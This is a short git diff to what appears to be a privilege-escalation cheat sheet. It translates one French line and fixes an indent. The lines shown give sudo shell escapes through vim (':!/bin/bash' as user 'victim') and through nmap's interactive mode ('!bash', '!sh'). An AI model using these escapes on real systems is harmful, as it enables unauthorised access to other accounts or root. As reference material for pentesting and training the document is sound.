@@ -115,7 +115,7 @@ then insert the following command :
 ##### Vim
 ```
 sudo -u victim /usr/bin/vim
-puis on tape (pas dans le fichier mais de la même manière que lorsque l'on souhaite quitter vim):
+then write the following command (same way to quit vim :!q):
 :!/bin/bash
 ```
 
@@ -131,7 +131,7 @@ sudo -u root /bin/bash
 
 ##### Nmap
 ```
- sudo -u nmap –interactive
+sudo -u nmap –interactive
 nmap>!bash
 or
 nmap>!sh
